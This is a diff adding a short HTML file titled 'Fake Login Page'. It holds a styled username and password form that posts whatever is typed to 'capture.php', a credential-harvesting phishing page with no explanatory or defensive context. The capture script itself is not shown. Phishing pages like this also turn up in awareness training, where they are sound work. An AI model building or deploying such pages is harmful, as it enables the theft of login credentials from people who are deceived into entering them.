@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .login-form {
+            display: inline-block;
+            text-align: left;
+        }
+        .login-form input {
+            display: block;
+            margin-bottom: 10px;
+            padding: 10px;
+            width: 200px;
+        }
+        .login-form button {
+            padding: 10px 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Login</h2>
+    <form action="capture.php" method="post" class="login-form">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
